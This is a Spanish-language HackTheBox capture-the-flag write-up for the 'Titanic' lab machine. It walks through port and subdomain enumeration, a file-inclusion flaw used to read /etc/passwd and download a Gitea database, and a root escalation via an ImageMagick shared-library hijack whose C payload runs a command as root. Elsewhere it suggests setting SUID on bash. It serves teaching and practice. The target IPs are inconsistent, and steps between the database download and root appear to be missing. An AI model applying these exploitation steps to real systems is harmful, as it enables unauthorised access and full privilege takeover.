---
title: "HTB: Titanic WriteUp"
author: iv4sh
date: 2025-03-03 14:00:00 +0800
categories: [HackTheBox, Easy]
tags: [RCE, LFI]
render_with_liquid: false
description: Guia para la resolución de la maquina Titanic de HackTheBox
---  

> El siguiente WriteUp tiene como propósito guiar la resolución de la máquina **Titanic** de HackTheBox, además de proporcionar una explicación de las vulnerabilidades encontradas.

![TitanicBanner](/assets/img/titanic/Titanic.png)

* **Máquina:** Titanic  
* **Plataforma:** Hack The Box  
* **Dificultad:** Fácil 😀  
* **Vulnerabilidades:** Local File Inclusion (LFI), ImageMagick  
* **Habilidades:** Enumeración de directorios y subdominios, interpretación de código, explotación de binarios.  

## **Fase de reconocimiento**  

* **IP atacante**: 10.10.16.76  
* **IP víctima**: 10.129.213.24  

Escaneamos los puertos abiertos bajo el protocolo TCP:  
```bash
sudo nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.129.213.24 -oG allPorts
```
`nmap`: Herramienta para el escaneo de puertos.  
`-p-`: Escaneará los 65535 puertos.  
`--open`: Filtra por los puertos abiertos.  
`-sS`: Modo de escaneo sigiloso y rápido, ya que no termina la conexión con el host.  
`--min-rate`: Establece un mínimo de paquetes enviados, en este caso 5000, lo que agiliza el escaneo.  
`-n`: No aplica resolución DNS.  
`-Pn`: Da por hecho que el host está activo.  
`10.129.213.24`: IP de la máquina víctima.  
`-oG`: Exporta el resultado del escaneo en formato 'grepeable' al archivo allPorts.  

Tenemos los siguientes puertos abiertos:

![allports](/assets/img/titanic/allports.png)

Podemos extraer los puertos del archivo allPorts y copiarlos al portapapeles con el siguiente comando:
```bash
grep -oP '\d{1,5}/open' allPorts | awk '{print $1}' FS="/" | xargs | tr ' ' ',' | xclip -sel clip
```

Realizamos un escaneo más amplio sobre los puertos descubiertos:
```bash
sudo nmap -p22,80 -sCV 10.129.213.24 -oN targeted
```
Usamos el parámetro `-sCV` para enviar ciertos scripts de reconocimiento a esos puertos y extraer la versión y el servicio que corre sobre cada puerto. Obtenemos la siguiente información:

![targeted](/assets/img/titanic/targeted.png)

Observamos que solo existen 2 puertos abiertos: el 22 corriendo el servicio *SSH* y el puerto 80 corriendo un servicio web *HTTP*.

---
## **Enumeración Web**  

La página que corre el servicio HTTP está usando **Virtual Hosting**, por ende debemos agregar el dominio al archivo `hosts`. Debemos modificar el archivo con permisos de superusuario.  
```bash
echo "10.10.11.28 titanic.htb" >> /etc/hosts
```

Tenemos la siguiente interfaz web:  
![web](/assets/img/titanic/web.png)

En esta web solo podemos subir información sobre un libro para después descargarla en formato *JSON*.

### Enumeración de Directorios y Subdominios  

```bash
gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 10.10.11.28 -t 100 2>/dev/null
```
Enumerando directorios mediante **GoBuster**, encontramos solamente dos sitios:  
1. http://titanic.htb/download  
2. http://titanic.htb/book  

El primero es el que nos permite descargar archivos en formato JSON.  

Dado que no es mucha la información que obtenemos de estos directorios, procedemos a enumerar la existencia de algún subdominio.  
```bash
gobuster vhost --append-domain -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://titanic.htb/ -t 50 -k | grep -v "301"
```
| Parámetro     | Descripción                                                                      |
| ------------- | -------------------------------------------------------------------------------- |
| `gobuster`    | Herramienta para la enumeración de directorios, subdominios, etc.                |
| `dir`         | Especifica la búsqueda de directorios.                                           |
| `-w`          | Especifica la ruta del diccionario a usarse, en este caso uno del **SecLists**.  |
| `-u`          | Especifica la **URL** víctima.                                                   |
| `vhost`       | Para descubrimiento de subdominios.                                              |
| `-t`          | Uso de hilos para agilizar la búsqueda. Hacer uso de muchos puede bajar la precisión. |
| `--append-domain` | Agrega el dominio principal a cada entrada de la wordlist.                  |

La ejecución del comando es la siguiente:  

![subdominio](/assets/img/titanic/suddominio.png)

Dentro del subdominio encontramos la página de **Gitea**, que funciona como un repositorio similar a GitHub.  

![gitea](/assets/img/titanic/Gitea.png)

Dentro de esta página podemos encontrar un repositorio que contiene el código de la página original.

---
## **Fase de Explotación**  

Dentro de los archivos de la página encontramos el siguiente fragmento de código:  

![code](/assets/img/titanic/code.png)

Vemos que hace referencia al directorio mencionado anteriormente `/download`. El código busca una ruta en el sistema de la cual descargará el archivo (línea 42), pero como observamos, sin ningún tipo de verificación, por lo que la ruta será válida mientras exista.

Esto nos permite realizar un LFI (*Local File Inclusion*) en la ruta de dicho directorio. Una ruta de interés sería la base de datos de Gitea alojada en el servidor.  
Pero primero necesitamos conocer los usuarios del servidor. Facilitamos la explotación del LFI con el uso de **BurpSuite**.  

![passwd](/assets/img/titanic/passwd.png)

Al enumerar el archivo `/etc/passwd`, encontramos todos los usuarios del sistema, y al filtrarlos por aquellos que poseen una terminal interactiva *Bash*, solo nos quedan los usuarios **developer** y **root**.

Posteriormente, procedemos a enumerar la base de datos en la siguiente ruta: `/home/developer/gitea/data/gitea.db` y descargamos los resultados a nuestra máquina.  
 

---

## Root Flag  

Realizamos una enumeración completa de la máquina con el objetivo de encontrar alguna vía para escalar nuestros privilegios, ya sea buscando binarios con permisos SUID o *capabilities*. Pero en este caso, observamos algo fuera de lo común en los procesos del sistema.  

![process](/assets/img/titanic/process.png)  

La ruta `/opt/app/app.py` nos muestra la ejecución de una aplicación a intervalos regulares de tiempo.  

Dirigiéndonos a la ruta, podemos encontrar un script que filtra los archivos de una ruta por imágenes y extrae la metadata mediante la herramienta **Magick**, que se ejecuta con privilegios de **root**.  

![magick](/assets/img/titanic/magick.png)  

Este binario tiene una vulnerabilidad que puedes explorar en detalle en el siguiente enlace: [ImageMagick](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)  

Básicamente, esta vulnerabilidad nos permite ejecutar comandos dentro del sistema con los permisos correspondientes del binario **Magick**, en este caso como **root**.  

### Explotación  

Para explotar este binario, nos dirigimos a la ruta donde se encuentran las imágenes `/opt/app/static/assets/image` y ejecutamos el siguiente comando:  

```c
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/pass.txt");
    exit(0);
}
EOF
```

Este comando crea un ejecutable que nos permite ejecutar el comando que le hayamos especificado. El proceso para que funcione es: ejecutamos el script generado >> actualizamos el directorio copiando una imagen cualquiera con formato `.jpg` para que el script mencionado en un paso atrás se ejecute >> al ejecutarse ese script, nuestro comando también será ejecutado.  

![exec](/assets/img/titanic/ejecucion.png)  

Haciendo más pruebas, comprobé que se pueden asignar permisos a cualquier archivo (como con `root.txt` en la imagen anterior), por lo que podemos ganar acceso como **root** al sistema simplemente asignando permisos SUID a la *bash*.  

---

> **GG!** Se recomienda leer la documentación relacionada con la vulnerabilidad para entender por qué y cómo funciona. :)  

---
